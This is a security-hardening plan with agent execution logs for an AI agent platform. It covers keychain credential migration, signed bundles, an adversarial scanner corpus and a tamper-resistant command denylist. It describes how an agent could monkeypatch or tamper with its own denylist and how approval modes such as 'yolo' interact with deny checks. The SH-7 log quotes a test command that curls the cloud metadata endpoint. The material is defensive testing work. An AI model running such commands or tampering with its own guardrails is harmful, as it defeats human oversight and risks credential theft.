# SECURITY-HARDENING

**Status:** DECOMPOSED — the executable work now lives in [`../atomic/SH.md`](../atomic/SH.md) as 10 atomic plan(s).

This plan was split because parts of it blocked on other plans, which forced it to sit half-done while other work ran. Each atom below its own file executes start-to-finish in one go; the dependency graph lives in [`../atomic/dag.json`](../atomic/dag.json).

The original design record is kept below — execution logs, measured findings and owner rulings are the reason this document still matters.

---
# Plan: Security Hardening — Deep Features Beyond Legibility

**Status:** DESIGNED — deepened 2026-07-18 with code recon (initial PROPOSED 2026-07-18; owner: "let's do this but towards the end of the roadmap")
**Created:** 2026-07-18
**Wave:** 4 — deliberately late; SECURITY-LEGIBILITY (Wave 0) carries the launch-time trust story.
**Depends on:** SECURITY-LEGIBILITY (the threat model that prioritizes this — its DISCOVERY entries seed candidate scope), CI-RELEASE-ENGINEERING (fuzz jobs, signing infra), ECOSYSTEM-TOOLING S2 (the registry signed manifests protect). The keychain slice (S1) is class B and reversible-migration-bearing, which is why this plan is ordered late (see the T1.2 note).
**Scope:** the security *features* deepening an already-strong architecture — credential storage, artifact signing, adversarial gate testing, the user-facing audit surface, external review. **Soul guardrail:** enforcement-over-request stands — every addition is a chokepoint control, never a prompt-side plea; and no addition may weaken a fail-closed default for convenience. This plan does not re-architect; it deepens existing chokepoints.

---

## Context (code recon, 2026-07-18)

- **Credentials:** `.env` (0600) via `config/loader.py::save_credential`; **no keyring backend today** (only an unrelated ssh-keyring path string in `acp/transport.py`).
- **Scanner is well-structured for fuzzing:** `supply_chain.py` — `Verdict`(rank), `TrustTier`, `Finding`, `ScanReport`(is_dangerous), `SkillScanner.scan(staged_dir, tier)` / `scan_text` / `_scan_script` / `_scan_invisible` (invisible-char detection already exists) / `_aggregate`. Clean seams for a corpus harness.
- **SEL has verification already:** `sel.py::verify_integrity(max_entries)` returns (checked, ok) — the chain-verify indicator for the audit page is a read away; periodic trim + startup verify already run.
- **Security panel exists:** `/api/security/{stats,denied-commands,egress}` — the SEL audit view extends this surface.

## Design

- **S1 — OS keychain (class B, consent-triggered reversible migration):** a keyring backend behind the existing `save_credential`/read API (macOS Keychain, Linux Secret Service via `keyring` lib as an *optional* extra — headless/container installs without a secret service **fail closed to `.env` 0600**, never fail open to plaintext-elsewhere). Lifecycle: opt-in → default-new-installs → migrate-on-consent (a migration moves `.env` secrets into the keychain, leaving `.env` keys absent; export exclusions unchanged; rollback = the pre-migration snapshot). `doctor` reports the active credential backend.
- **S2 — signed manifests + registry trust:** maintainer signing of first-party + registry-listed bundles (minisign or Sigstore keyless — decide against CI capabilities in the task; minisign is simpler, no OIDC dance, one public key shipped in-tree). The Store verifies signatures and renders state on the consent surface (`signed by <known key>` / `unsigned — community tier`); **unsigned stays installable at community tier** (graduated trust, never a hard wall — the supply-chain-tier doctrine). Registry (`ECOSYSTEM-TOOLING`) records signer identity per listing.
- **S3 — adversarial gate testing:** a hypothesis-driven corpus against `SkillScanner`/`install_guarded`: archive attacks (symlink escape, path traversal, case-collision, zip-slip), the scanned-bytes==installed-bytes integrity invariant under concurrent install races, verdict-evasion (obfuscated/split dangerous patterns, invisible-char tricks the existing `_scan_invisible` should catch — prove it), degenerate/oversized manifests. Corpus committed; nightly CI job; **publish the corpus + methodology** (`docs/security/scanner-testing.md`).
- **S4 — SEL as a user surface + external review:** a "What did my agent do" audit page (filter by caller/operation/outcome/downstream-service, chain-verify indicator from `verify_integrity`, export) extending the security panel; and an external review (commissioned or a structured public self-audit) of the highest-risk paths — webhook auth (`_verify_hook_token`), app reverse-proxy token model, scanner bypasses, egress guard layering, inbound surfaces (plans 41/24) — findings published with fixes per SECURITY.md.

## Contracts & Interfaces (conventions per [AGENTS.md](../../../AGENTS.md))

### C1 — Credential backend selector (behind existing `save_credential`/read API, §2.5 — callers unchanged)
```python
CredentialBackend = Literal["keychain", "dotenv"]
def credential_backend() -> CredentialBackend: ...   # keychain if available+enabled, else dotenv
# save_credential(key, value) routes to the active backend; reads are backend-transparent.
# Absent secret service (headless/container) → dotenv fallback + doctor warn. NEVER plaintext-elsewhere (fail-closed to the MORE protected store).
```
`keyring` as an optional extra. Class B. Consent-triggered migration `credentials_to_keychain` (moves `.env` secrets → keychain, removes keys from `.env`; snapshot-backed; rollback restores `.env`). **Shares this backend with EXECUTION-ISOLATION's secret vault** (build once — the two must not fork two credential backends).

### C2 — Manifest signature (minisign recommended; decide in T2.1)
`ScanReport`/consent payload gains `signature: {state: "signed"|"unsigned"|"invalid", signer: str}`. Store verifies if present; **unsigned → community tier, still installable** (graduated trust). Public key shipped in-tree; `scripts/sign_app.py` for maintainers. Registry (plan 38) records signer per listing.

### C3 — Adversarial corpus layout
`tests/security/corpus/<class>/` for the five classes (archive, integrity-race, verdict-evasion, invisible-char, degenerate-manifest); `tests/security/test_scanner_adversarial.py` (hypothesis strategies + fixed fixtures) against `SkillScanner.scan`/`install_guarded`. Published methodology `docs/security/scanner-testing.md`. Nightly job in `full.yml`.

### C4 — SEL audit surface (reuses `verify_integrity`, §3.3)
`GET /api/security/audit` (paginated, filters: caller/operation/outcome/downstream_service/time) + `GET /api/security/audit/verify` → `{checked, ok}` (wraps `verify_integrity`). Export = credential-safe JSONL (reuse `redact`). Frontend page under Settings → Security.

### Integration points
- **Calls:** `save_credential`/credential store, `SkillScanner`/`install_guarded`, `sel().verify_integrity`, the consent-triggered credential migration, `redact`.
- **Consumed by:** plan 38 (registry signer records), plan 13 (shared credential backend).
- **Owner-critical:** the signing private key (owner task 2). Its recovery note lives with this plan's owner task 2 — plan 37's continuity doc was descoped 2026-07-31, so this plan owns the safeguarding record.

## Task breakdown (executor-ready — run under the roadmap session discipline in [AGENTS.md](../../../AGENTS.md))

### Session 1 — OS keychain credential storage

| ID | Task | Files | Done when |
|---|---|---|---|
| T1.1 | Keyring backend behind the credential API: `save_credential`/read gain a backend selector (`keychain` | `dotenv`), `keyring` as an optional extra; **absent secret service → fall back to `.env` 0600 with a doctor warning (never plaintext-elsewhere)** | `src/personalclaw/config/loader.py`, `pyproject.toml` extra, `cli_doctor.py` | reads are backend-transparent; headless fixture (no keyring) uses `.env`; backend reported by doctor; unit tests both backends |
| T1.2 | Credential migration `credentials_to_keychain` (moves `.env` secrets → keychain, removes the keys from `.env`; idempotent; snapshot-backed; rollback restores `.env`), triggered on explicit user consent | `src/personalclaw/config/loader.py` (+ a small migration helper) | migration fixture (with a fake keyring) moves + verifies; rollback restores; `portability` export still excludes secrets |

> **This is the one class-B slice that is NOT a plain clean break.** Everywhere
> else during 0.x, a class-B change ships as a clean break under the pre-1.0
> banner. Here it must not: **silently losing a user's stored credentials is not
> an acceptable clean break**, so the keychain move is an idempotent,
> snapshot-backed, reversible migration built directly against the credential API
> — the rollback path is the point of the task. There is no `lifecycle/` gate
> registry to lean on (the migration-backed regime is deferred), so the migration
> is consent-triggered and its own reversibility is the safeguard. This is the
> reason SECURITY-HARDENING is ordered late.
| T1.3 | Settings → Security note: which backend is active + a "move to keychain" action (triggers the migration with the snapshot confirm) | security settings component | action runs the migration with a visible snapshot step; state reflects post-migration |
| V1 | Validation: on macOS — migrate a test credential into Keychain, confirm chat still authenticates, rollback restores `.env`; on a headless fixture — confirm `.env` fallback + warning | — | both paths recorded |

### Session 2 — Signed manifests + registry trust

| ID | Task | Files | Done when |
|---|---|---|---|
| T2.1 | Signing scheme decision + doc (minisign recommended; record rationale), signing key generated (owner task 2), public key shipped in-tree; a `scripts/sign_app.py` for maintainers | `docs/security/signing.md`, `scripts/sign_app.py`, public key file | signing + verifying a sample bundle round-trips locally |
| T2.2 | Store verification: at install, verify signature if present; `ScanReport`/consent payload gains `signature: {state, signer}`; consent UI renders it; **unsigned → community tier, still installable** | `supply_chain.py` or `apps/app_manager.py` install path, consent UI | signed first-party bundle shows "signed by PersonalClaw"; tampered signature → refused with reason; unsigned → community-tier consent |
| T2.3 | Release pipeline signs first-party app bundles + core release artifacts; registry (plan 38) records signer per listing | `release.yml`, registry validation script | released bundles carry valid signatures (CI-verified) |
| V2 | Validation: install signed, unsigned, and tamper-signed fixtures — each behaves per design | — | holds |

### Session 3 — Adversarial gate testing

| ID | Task | Files | Done when |
|---|---|---|---|
| T3.1 | Corpus harness: hypothesis strategies + fixed malicious fixtures for the five attack classes (archive, integrity-race, verdict-evasion, invisible-char, degenerate-manifest) against `SkillScanner`/`install_guarded` | `tests/security/test_scanner_adversarial.py`, `tests/security/corpus/` | each class has ≥1 asserting test; any that surfaces a real bypass files an issue + fix (or a documented accepted-risk with rationale) |
| T3.2 | Concurrency/integrity: a test forcing a swap-after-scan attempt proves the scanned-bytes==installed-bytes invariant holds under a race | scanner install path test | race fixture cannot land unscanned bytes |
| T3.3 | Nightly CI job + published methodology (`docs/security/scanner-testing.md`, corpus described, how to run) | `.github/workflows/full.yml`, doc | nightly runs the corpus; doc lets an outsider reproduce |
| V3 | Validation: introduce a deliberate scanner weakness on a branch → corpus catches it | — | red-on-weakness proven |

### Session 4 — SEL surface + external review

| ID | Task | Files | Done when |
|---|---|---|---|
| T4.1 | Audit API: paginated SEL read with filters (caller/operation/outcome/downstream_service/time) + a chain-verify endpoint wrapping `verify_integrity` | `dashboard/handlers/` security module, routes beside `/api/security/*` | filters work; verify endpoint returns (checked, ok) with a tamper fixture showing ok=false |
| T4.2 | "What did my agent do" page: filterable SEL table, chain-verify indicator, export (jsonl, credential-safe — reuse redaction) | `web/src/pages/settings/` security/audit view | page renders real events; export excludes secrets (fixture-verified); both themes/WCAG |
| T4.3 | External-review scoping doc: the five high-risk paths, review format (commissioned vs structured self-audit), publication plan | `docs/security/review-scope.md` | scope approved (owner task 3); review executed or scheduled with a date |
| V4 | Validation: audit page over a seeded SEL with a deliberately-broken chain link shows the break; export round-trips | — | holds |

## Owner tasks (real world)

1. **macOS Keychain validation** (V1) — 15 min on your Mac.
2. **Generate + safeguard the signing key** (S2): create the minisign (or Sigstore identity) keypair; the private key is a release-critical secret — store it in your password manager + the CI `release` environment, and record its recovery in this plan (plan 37's continuity doc was descoped 2026-07-31). This is a keep-it-safe-forever artifact.
3. **Decide external review** (S4): budget for a professional audit of the five paths (a scoped agent-security review is a real line item) vs. a published structured self-audit. Either is credible; the choice is yours to fund.
4. **Approve publishing the scanner corpus** (S3) — it advertises exactly how your gate is tested (a strength, but your call to make it public).

## Risks & open questions

- **`keyring` dependency reliability** across Linux desktops varies (Secret Service presence) — the fail-closed-to-`.env` default contains it; keychain is an upgrade, never a requirement.
- **Signing key loss** would break the update/trust chain — owner task 2's safeguarding + its recovery note (kept in this plan; plan 37's continuity doc was descoped 2026-07-31) are the mitigation; minisign's simplicity (single keypair, no CA) is deliberately chosen to make recovery tractable.
- **Open:** whether to pursue a CVE-numbering-authority relationship or just GitHub advisories — GitHub advisories suffice at this scale; revisit if adoption warrants (ratchet).

## Amendment (2026-07-26 — sibling-platform gap analysis, owner greenlight)

**What & why.** Tamper-resistant baseline denylist. Recon confirms the premise with one correction: `denied_command_patterns()` (security.py:658) returns `BUILTIN_DENIED_COMMAND_PATTERNS + user additions` — the 112-entry built-in list (verified count) is a module constant that user config can only APPEND to, never remove, so the *read path* is already add-only. The real gaps: (1) the baseline lives only as importable module state — an agent-written `sitecustomize`/monkeypatch, a tampered install, or a future refactor could mutate the list with no detection (the S1 Doctor DISCOVERY already flagged `redact()`'s narrowness to this plan — same anti-tamper family); (2) nothing *asserts* at runtime that the effective list is a superset of the packaged baseline; (3) permissive approval modes must be provably irrelevant — recon shows `_denied_bash_reason` runs before execution unconditionally (builtin_tools.py:1443, upstream of the approval gate; `auto/yolo` at runtime.py:968 only skips the *ask*), which this amendment locks in as a tested invariant rather than an accident of ordering. **Honest limitation:** the user owns the box and can edit the installed package; this is anti-drift and anti-LLM-tamper, not anti-owner.

**Design (contract level).**
- Baseline ships as a **packaged data file** `security/baseline_denylist.json` `{version, sha256, patterns[]}` (single source; `BUILTIN_DENIED_COMMAND_PATTERNS` becomes the loaded copy). `denied_command_patterns()` re-asserts on every read via a cheap cached-integrity check: recompute the in-memory list's hash against the packaged sha; mismatch → reload from the packaged file + `sel().log(SecurityEvent(event_type="baseline_denylist_reasserted", …))`. The 30s heartbeat-adjacent doctor probe re-verifies periodically.
- **Removal attempts ignored + logged:** config keys that could shadow the baseline (a hypothetical `security.removed_denied_commands` or list-typed overwrite of the merged view) are rejected at `load()`; any user pattern textually equal to a baseline entry is deduped silently; a PATCH attempting to shrink the effective set below baseline returns the standard error envelope `{code: "baseline_denylist_immutable"}` + SEL `baseline_denylist_tamper_attempt`.
- **Mode-independence invariant:** a test matrix asserting `execute_bash` refuses a baseline-matched command under every approval policy (`default`, `auto`, `yolo`, `acceptEdits`) and under trust-level simulators — the deny check at builtin_tools.py:1443 precedes approval and must stay there (regression-pinned). Guardrails' `denylist.py:164` merge (which also concatenates the baseline) inherits the same source file, so action-provider dispatch stays in lockstep.

**Lands in:** extends **Session 3** (adversarial gate testing — the baseline-integrity fixtures are a sixth corpus class: `baseline-tamper`) plus one small task in Session 4's surface work. Count stays **4 sessions** (S3 grows by ~half a session, absorbed; recorded honestly here).

| ID | Task | Files | Done when |
|---|---|---|---|
| T3.4 | Baseline as packaged data (`baseline_denylist.json` + sha), loader with integrity re-assert on read + periodic re-verify; SEL events `baseline_denylist_reasserted`/`_tamper_attempt`; user config strictly additive (dedupe, no shrink path) | `src/personalclaw/security.py`, `src/personalclaw/security/baseline_denylist.json`, `guardrails/denylist.py` | mutating the in-memory list at runtime is healed on next read + SEL-logged; effective set is provably ⊇ packaged baseline (property test); user additions still merge |
| T3.5 | Mode-independence matrix: baseline-matched command refused under default/auto/yolo/acceptEdits and all trust simulators; deny-before-approval ordering regression-pinned; `baseline-tamper` corpus class added to the S3 harness | `tests/security/test_scanner_adversarial.py`, `tests/security/corpus/baseline-tamper/`, native runtime/builtin_tools tests | every mode fixture refuses; reordering the deny check below the approval gate turns CI red |
| T4.4 | Security panel: baseline shown read-only with version + verified-hash indicator and "N user additions"; docs state the anti-drift/anti-LLM-tamper (not anti-owner) threat model honestly | `dashboard/handlers/core.py` (`/api/security/denied-commands` payload), security settings page, `docs/security/` | panel renders baseline-verified state; tamper fixture flips the indicator; limitation documented |

## Execution log

### 2026-08-26 — SH-2 (T1.2 / T1.3 / V1) consented credential move to the keychain — DONE

- **[SH-2] DONE:** `config/credential_migration.py` owns `credentials_to_keychain` —
  `migrate_credentials_to_keychain(confirm=)`, `rollback_credentials_to_keychain(confirm=)`,
  `verify_credential_migration()` and `credential_migration_status()`. The gate is
  `security.credential_keychain`; the surface is `GET|POST /api/security/credentials{,/migrate,
  /rollback}` plus a "Credential storage" section in Settings → Security. 34 tests in
  `tests/test_credential_migration.py`, 10 in
  `web/src/pages/settings/credentialMoveConfirmsTheSnapshot.test.tsx`.

- **[SH-2] The invariant the plan's T1.2 note demands ("silently losing a user's stored
  credentials is not an acceptable clean break") is implemented as one rule: NO KEY LEAVES
  `.env` UNTIL ITS VALUE HAS BEEN READ BACK OUT OF THE KEYCHAIN.** Snapshot first
  (`.env.pre-keychain`, exact bytes, 0600, atomic, `IF NOT EXISTS`), then per key: write →
  **re-read** → remove. Rollback writes the snapshot bytes back verbatim and clears exactly the
  keys the snapshot named; a credential the user added to the keychain *after* migrating is left
  alone. A partial rollback KEEPS the snapshot, because deleting it after a half-cleared keychain
  would strand the user with copies in both stores and no way back.

- **[SH-2] FINDING (fixed here, found by the lying-backend fixture) — leaving the key in `.env`
  is NOT sufficient on a failed read-back.** `_keychain_save` returning True only means the
  backend did not raise. With a fixture that accepts a write and returns different bytes, `.env`
  was correctly left intact — and `get_credential` still returned the CORRUPTED value, because
  SH-1's reads are the union of both stores with the **keychain preferred**. So the mismatch path
  now also `_keychain_delete(key)`s the bad entry. Without that line the credential is lost in
  practice while sitting on disk, which is the exact failure this atom exists to prevent.

- **[SH-2] DEVIATION — re-scoped from "class-B gate + `m_*_credentials_to_keychain` migration" to
  the same behaviour without lifecycle machinery.** `LIFECYCLE-DOCTRINE.md` was deleted in PR #897
  and there is no `lifecycle/` package; `CONTRIBUTING.md` keeps the migration-backed regime as "a
  mental model, not shipped machinery", deferred until the architecture stops moving. Hand-rolling
  a `m_*` migration registry + gate here would have built a parallel mechanism the real one
  deletes. Every substantive clause of the atom's own prose is implemented literally
  (user-consented, snapshot-backed, reversible, idempotent, verified); only the `m_*_` naming and
  the gate/dual-path/cleanup ceremony are dropped. The `credential_keychain` **config gate** is
  real and is the persisted user opt-in — the plan asked for that in T1.3 and SH-1 explicitly
  deferred it here.

- **[SH-2] DEVIATION — `config/loader.py` was split.** Measured on `origin/main`: 5900 lines
  against `scripts/generate_structural_baseline.py`'s `SIZE_CEILING_LINES = 6000`, with
  `test_structural_baseline.py` asserting `ceiling - max_file_lines >= 100`. Headroom was exactly
  100, so **+1 line reds CI** — that test's own docstring names this file and "adding one boolean
  toggle would red CI". The credential store therefore moved to `config/credentials.py`
  (selector, keychain helpers, dotenv helpers, `save_credential`/`get_credential`, plus SH-2's new
  `_keychain_delete` and `_dotenv_remove_credentials`). No re-export shim: nine `src/` import
  sites and two test files were updated. Precedent: `agents/native/decision_tool_defs.py`, split
  from `builtin_tools.py` for the same rail. `loader.py` 5900 → 5647.

- **[SH-2] PREMISE CORRECTION — "snapshot-backed" cannot mean `personalclaw snapshot`.**
  `snapshot.py::_extra_restore_paths` **deliberately excludes every `secret=True` path from
  restore** ("restoring `.env`/`credentials/`/`.local_secret` generically would re-plant credential
  material into a home that may have deliberately rotated it"). So the generic snapshot captures
  `.env` but will not give it back, and a rollback built on it would report success and restore
  nothing. The migration therefore owns its own single-purpose backup. That file is claimed as a
  `secret=True` inventory entry (`env_pre_keychain`) so `audit_home()` sees it and
  `portability.EXPORT_EXCLUDE` — a projection of the secret set — excludes it, and it is ALSO a
  literal in `_inventory_secrets()`'s fallback set, which exists precisely for when the inventory
  cannot be imported.

- **[SH-2] FINDING (P3, no fix needed — verified, not assumed) — `cli.py::main()` calls
  `load_dotenv(<home>/.env)` and is not keychain-aware.** After a migration that file is empty, so
  the pre-parse contributes nothing. Traced the consequence rather than patching it:
  `gateway.py:336` calls `cfg.load_credentials()`, which is the union of both stores and
  `setdefault`s every value into `os.environ`, so a migrated install still authenticates. The
  macOS validation leg below confirms `get_credential` reads through after the move. Left alone
  deliberately — adding a keyring read to `main()` before arg parsing would cost every CLI
  invocation for a path `load_credentials()` already covers.

- **[SH-2] V1 VALIDATION — macOS migrate/rollback, recorded.** Darwin 25.6.0, real `keyring`
  25.7.0 installed into a worktree-local target (NOT the shared `.venv` — four sibling agents
  share it), isolated `PERSONALCLAW_HOME` under `/private/tmp`, gate ON via `config.json`:
  `keychain_available()=True`, `credential_backend()=keychain`, warning `''`. migrate#1 →
  `ok=True moved=['SH2_VALIDATE_ANTHROPIC','SH2_VALIDATE_SLACK'] failed=[]`; `.env` left as
  `'# provider credentials\n# keep this comment\n'` at 0600 (both comments preserved); keychain
  holds both secrets + the key index; `get_credential` returns `'sk-ant-validate-0001'`; snapshot
  0600 and byte-identical to the original; verify `True/2`. migrate#2 → `moved=[] already=[]`,
  snapshot unchanged. rollback → `ok=True`, `.env` **byte-identical** to pre-migration at 0600,
  keychain index back to `[]`, snapshot removed, `get_credential` reads `.env` again. `doctor`
  printed `credentials: 🔐 OS keychain (keyring)`.
  **Scope boundary, stated rather than glossed:** the OS-store leaf (`keyring.backends.macOS`) was
  deliberately NOT exercised. keyring upstream IGNORES a specified keychain on macOS (`warn_keychain`,
  issue #623), so the only way to reach the real Security framework is the owner's **login**
  keychain, and writing credentials there is out of bounds. What ran instead is a real
  `KeyringBackend` subclass registered through `keyring.set_keyring()`, so the real module
  dispatch, `_usable_keyring()`'s backend classification and real `PasswordDeleteError` semantics
  all executed; only the storage leaf was substituted.

- **[SH-2] V1 VALIDATION — headless `.env` fallback, recorded.** Same driver with `keyring`
  blocked at `sys.meta_path`: `keychain_available()=False`, `credential_backend()=dotenv` while
  `requested=keychain`; migrate refused with *"no usable OS keyring backend is available on this
  machine; credentials stay in .env at mode 0600"*; `.env` byte-identical and still 0600; rollback
  refused with *"no pre-migration snapshot (.env.pre-keychain) — nothing to roll back to"*;
  `doctor` printed the `.env` line **plus** the fallback warning. Real home untouched in both legs.

- **[SH-2] Falsifications, each mutation grep-confirmed on the live line and restored from a file
  copy:**
  - Neutered the read-back guard to `if False and _keychain_get(key) != value:` →
    `test_a_keychain_that_lies_about_a_write_keeps_that_key_in_env` red (`assert not True`): the
    corrupted key was moved and deleted from `.env`.
  - Moved `_write_snapshot()` below the per-key loop (snapshot AFTER the keys move) → the **Python
    suite stayed GREEN (33 passed)** and the FE rail
    `credentialMoveConfirmsTheSnapshot > the snapshot really is written first` went red. That
    asymmetry is why the dialog-body rail reads the Python source: the ordering the confirm dialog
    *claims* had no other guard.
  - Flipped the inventory entry to `secret=False` and dropped the portability literal → 3 red,
    including the end-to-end export, which really did carry
    `personalclaw-export-…/.env.pre-keychain`.
  - Deleted `"security.credential_keychain"` from `_EDITABLE_CONFIG` → **`test_config_roundtrip.py`
    stayed GREEN (17 passed).** That file covers the dataclass, `load()` and `to_dict()`; the PATCH
    allowlist is the point it does not reach, and a field missing from it is silently dropped, so
    the toggle would report success and change nothing. Added
    `test_the_gate_has_a_write_path_and_the_patch_allowlist_declares_it`; re-ran the same mutation
    → red.
  - Reverted the gate read to `bool(security_data.get(...))` → **8 green.** `_validate_config_data`
    runs first and `config/schema.py`'s `SCHEMA_REGISTRY` (generated from the dataclass, so the new
    bool got an entry for free) strips a type mismatch to the default. The `is True` read is the
    second line of defence, not the enforcer; the test's docstring was corrected to say so rather
    than left claiming a mechanism it does not exercise.

- **[SH-2] PRE-EXISTING RED, not mine:**
  `test_structural_baseline.py::test_three_simultaneous_structural_violations_report_as_three`
  failed on arrival because `config-baseline.json` was stale for an unrelated reason, making a
  FOURTH gate fail and breaking its `"SUMMARY: 3 of 6"` assertion. Regenerating
  `config-baseline.json` (which my new field required anyway — the diff is exactly the one
  `security.credential_keychain` entry) cleared it. All 6 gates pass.

### 2026-08-18 — SH-7 mode-independence matrix + deny-before-approval pin — DONE

- **[SH-7] DONE:** all three clauses land in `tests/security/`, with no `src/` change needed.
  1. `tests/security/test_mode_independence.py` — the matrix. `default` / `auto` / `yolo` /
     `acceptEdits` plus three trust simulators (channel `!yolo on`, dashboard 6h toggle, and
     the no-TTL `from_config` YOLO) each drive a REAL `NativeBuiltinToolProvider` bash tool
     through a REAL `NativeAgentRuntime`; every cell refuses a baseline-matched command and
     `sandbox.create_subprocess_limited` is never reached. 31 tests.
  2. `TestDenyPrecedesTheApprovalGate` — the regression pin, doubled: a structural AST rail
     (`security.is_denied` must lexically precede `self._requires_approval` inside
     `runtime.py::_guard_and_invoke`) and a behavioural rail (a deny-listed tool is never
     invoked under `default` even though the driver approves every prompt).
  3. `baseline-tamper` corpus class — five inert JSON cases under
     `tests/security/corpus/baseline-tamper/`, registered in `ATTACK_CLASSES`, with four new
     `HANDLERS` rails and two new rows in `TestCorpusRedsOnAWeakenedScanner`.

- **[SH-7] PREMISE CORRECTION — the "S3 harness" is not `harness/`.** The briefing placed the
  corpus in `harness/` (`baselines.py` / `traces` / `specs` / `exemplars`) and noted there was
  no `harness/corpus/`. There is no `harness/corpus/` because SH-5's corpus never lived there:
  it is `tests/security/corpus/<class>/<case>.json` driven by
  `tests/security/test_scanner_adversarial.py`, exactly as `docs/security/scanner-testing.md`
  documents. `harness/` is the Self-Verification replay harness — a different mechanism. The
  new class follows SH-5's real convention and `harness/` is untouched.

- **[SH-7] DEVIATION — `docs/security/scanner-testing.md` edited, though it sits outside the
  declared fence.** Not optional: `TestCorpusIsComplete::test_methodology_doc_documents_every_class`
  reds when a class in `ATTACK_CLASSES` is absent from that doc. Adding the class without the
  doc is not a shippable state, so the two move together.

- **[SH-7] FINDING (P2, legibility/audit — NOT an execution bypass) — the command-level
  baseline screen sits BELOW the approval gate.** Measured call sites: the *tool-name* deny
  (`security.is_denied`) is at `runtime.py:1011`, above the gate at `runtime.py:1041` — correct
  and now pinned. But the *command* screen (`_denied_bash_reason` →
  `security.denied_command_reason`) is at `builtin_tools.py:1470`, inside the bash tool body,
  i.e. after `_guard_and_invoke` has already returned. It is unconditional and precedes the
  spawn at `builtin_tools.py:1512`, so no approval mode can execute a baseline-denied command —
  the matrix proves that empirically for all seven cells. The cost is legibility: a
  baseline-denied command is surfaced to the user as an approvable request first, and under
  `--approval yolo` `gateway.py:400` writes a `cli_approval_auto_approve` outcome=`ok` SEL row
  for a command that is then refused. **Deliberately not fixed here:** the fix belongs in
  `runtime.py` (outside SH-7's fence, and shared with four concurrently-running atoms), and it
  needs an owner call on how the runtime learns which tools carry a shell command.
  `test_command_denylist_is_enforced_below_the_gate` pins today's shape and instructs the fixer
  to delete it, so the gap cannot persist silently.

- **[SH-7] Falsifications performed on the live tree, each restored from a file copy:**
  - Moved the `security.is_denied` block below `return _NEEDS_APPROVAL` in `_guard_and_invoke`
    (deny 1039, gate 1036): both pins red. The behavioural one reported
    `tool.invoked == [{}]` — the deny-listed tool **actually executed** after approval, so the
    inversion is a real bypass, not a style regression.
  - Neutered `_denied_bash_reason` to `return None`: **15 of 21** matrix cells red, including
    every `yolo` and `acceptEdits` cell and all three trust cells; the spawn spy caught
    `('bash', '-lc', 'curl http://169.254.169.254/latest/meta-data/')`.
  - Moved the bash screen below the spawn (screen 1510, spawn 1503):
    `DENY-AFTER-SPAWN ORDERING REGRESSION in builtin_tools.py::_t_bash`.
  - Pointed `BASELINE_COMMAND` at a non-matching string: the vacuity floor red with
    `'echo sh7-probe-that-matches-nothing' matches nothing — matrix is vacuous`.

- **[SH-7] Gate:** `make lint` clean (black/isort/flake8/mypy, 909 source files).
  `tests/security/` 105 passed · `tests/test_baseline_denylist_integrity.py` +
  `test_denied_commands.py` + `test_security.py` + `test_roadmap_dag_derived.py` 217 passed ·
  `tests/test_native_runtime.py` 32 passed. 354 passed, 0 failed, 0 skipped. No `web/` change.

### 2026-08-16 — SH-8 (S4 T4.1/T4.2/V4 · Contract C4) SEL audit surface — DONE

- **[SH-8] DONE:** C4 lands as `GET /api/security/audit` (cursor-paginated, filters
  caller/operation/outcome/downstream_service/since/until) and `GET /api/security/audit/verify`
  (`{checked, ok, valid, tampered, windowed}`) in a new
  `dashboard/handlers/security_audit.py`, registered beside the other `/api/security/*` reads.
  The reader itself is `sel.SecurityEventLog.audit_page()` — it needs `_tail_lines` and the HMAC
  key, so it lives with them rather than reaching into SEL privates from a handler.

- **[SH-8] DISCOVERY — the surface already half-existed, and its pagination was a stub.**
  `/api/sel/events` + `/api/sel/verify` + a `settings/AuditPanel.tsx` were already shipped. The
  panel fetched a **fixed 200 events** and filtered them **client-side**, and `api.ts` sent an
  `offset` query param that **the handler never read** — so "pagination" was decorative. Under
  the clean-break tenet (and AGENTS.md "There is one audit log — never a second") the two GET
  routes were **deleted, not duplicated**: one audit log, one way to read it. `POST /api/sel/rotate`
  is untouched — a write path with a different risk profile and outside this atom. Census before
  deleting: 6 code sites + 2 doc lines, all updated.

- **[SH-8] DEVIATION — an offset scheme is unfixable here, so the contract is a cursor.**
  C4 says "paginated" without naming a scheme. An offset over an append-only log read
  newest-first is wrong by construction: *k* concurrent appends shift every element *k* places,
  so page 2 re-serves *k* seen rows, and a concurrent `prune()` shifts the other way and **skips**
  rows — an audit surface omitting events while looking complete. `audit_page` therefore anchors
  on the last row's `event_id`: a page is the next `limit` matching records strictly older than
  the anchor, and appends land strictly newer, so pages 2..N cannot shift. An anchor that aged
  out returns `cursor_found=False` → **400 `invalid_cursor`**, never a silent restart from the
  newest record (which would re-serve the whole trail as if fresh).

- **[SH-8] Authorization — the audit read is OWNER-ONLY, a deliberate tightening.**
  The trail spans every actor on the instance, so an app-scoped token reading it is a
  cross-tenant read — the same escalation `POST /api/apps/{name}/token` already refuses ("apps
  may not mint tokens"). The app-permission middleware is only an allowlist, so an app that
  *declared* `/api/security` would have passed it; `_refuse_app` is the categorical refusal, and
  it SEL-logs the denial exactly as the middleware's own deny path does. **Measured before
  enforcing** (per "enforcing a dead control is an outage"): zero apps declare `/api/sel` or
  `/api/security` — the native bundles declare no `api` scope at all and the two first-party
  apps declare unrelated prefixes — so the refusal denies nothing that works today. The
  superseded `/api/sel/events` had no such refusal; this is strictly tighter than what it replaced.
  Successful reads are **not** logged: this repo audits mutations only (`sel_audit_middleware`),
  and a read that appends to the log it just read would grow the log on every page view and
  appear in its own results.

- **[SH-8] Credential safety — one redaction definition, and it runs AFTER verification.**
  `log()`'s inline `_redact_deep` closure was promoted to module-level `sel.redact_event()`, now
  shared by the forward callback and the audit read, so the table and the export can never
  disagree about what is safe. Ordering is load-bearing: `integrity_ok` is computed on the RAW
  line, because redacting first rewrites the very bytes the HMAC covers and would report every
  secret-bearing record as tampered. `_UNREDACTED_FIELDS` exempts the five machine-generated
  structural fields (`event_id`/`timestamp`/`event_type`/`prev_hash`/`entry_hash`) so an exported
  record stays verifiable by anyone holding the key — `_B64_CHUNK_RE` matches any 40+ char run of
  the base64 alphabet and a 64-char hex digest qualifies, so today it spares the hashes only
  because random decoded bytes don't look like a credential. Now it spares them by rule.

- **[SH-8] Fail-closed filtering.** An unknown query param, a non-integer or out-of-range
  `limit`, an unparseable time bound and an expired cursor are all **refused** with the
  §"Shared conventions" envelope (`unknown_filter` / `invalid_limit` / `invalid_time_filter` /
  `invalid_cursor`), never ignored — a silently-dropped filter returns the whole log while
  looking like it narrowed it. A date-only `until` widens to end-of-day, because bare
  lexicographic compare against `YYYY-MM-DD` means midnight and would hide the whole named day.

- **[SH-8] Frontend (T4.2).** `AuditPanel.tsx` moves to server-side filters + cursor
